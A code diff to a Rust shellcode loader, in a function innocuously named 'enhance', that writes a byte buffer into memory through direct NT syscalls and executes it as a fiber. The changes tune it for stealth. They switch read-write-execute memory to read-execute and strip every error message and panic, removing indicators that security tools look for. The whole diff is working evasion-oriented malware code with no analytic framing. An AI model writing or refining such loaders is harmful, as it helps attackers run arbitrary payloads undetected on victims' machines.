@@ -8,10 +8,9 @@ use rust_syscalls::syscall;
 use winapi::ctypes::c_void;
 use winapi::{
     shared::ntdef::NT_SUCCESS,
-    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
+    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
 };
 use windows_sys::Win32::{
-    Foundation::GetLastError,
     System::Threading::{
         ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE,
     },
@@ -34,7 +33,7 @@ fn enhance(mut buf: Vec<u8>) {
         let mut size: usize = buf.len();
         let alloc_status = syscall!("NtAllocateVirtualMemory", NtCurrentProcess, &mut allocstart, 0_usize, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(alloc_status) {
-            panic!("Error allocating memory to the local process: {}", alloc_status);
+            return;
         }
 
         let mut byteswritten = 0;
@@ -42,13 +41,13 @@ fn enhance(mut buf: Vec<u8>) {
         let mut buffer_length = buf.len();
         let write_status = syscall!("NtWriteVirtualMemory", NtCurrentProcess, allocstart, buffer, buffer_length, &mut byteswritten);
         if !NT_SUCCESS(write_status) {
-            panic!("Error writing to the local process: {}", write_status);
+            return;
         }
 
         let mut old_perms = PAGE_READWRITE;
-        let protect_status = syscall!("NtProtectVirtualMemory", NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
+        let protect_status = syscall!("NtProtectVirtualMemory", NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READ, &mut old_perms);
         if !NT_SUCCESS(protect_status) {
-            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
+            return;
         }
 
         let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(allocstart);
@@ -58,7 +57,6 @@ fn enhance(mut buf: Vec<u8>) {
         let buf_fiber_address = CreateFiberEx(0, 0, 0, buf_ptr, null_mut());
 
         if buf_fiber_address.is_null() {
-            eprintln!("[!] CreateFiber Failed With Error: {}", GetLastError());
             return;
         }
 
@@ -66,10 +64,6 @@ fn enhance(mut buf: Vec<u8>) {
         // no need to move this call, already the lowest
         let primary_fiber_address = ConvertThreadToFiber(null_mut());
         if primary_fiber_address.is_null() {
-            eprintln!(
-                "[!] ConvertThreadToFiber Failed With Error: {}",
-                GetLastError()
-            );
             return;
         }
 
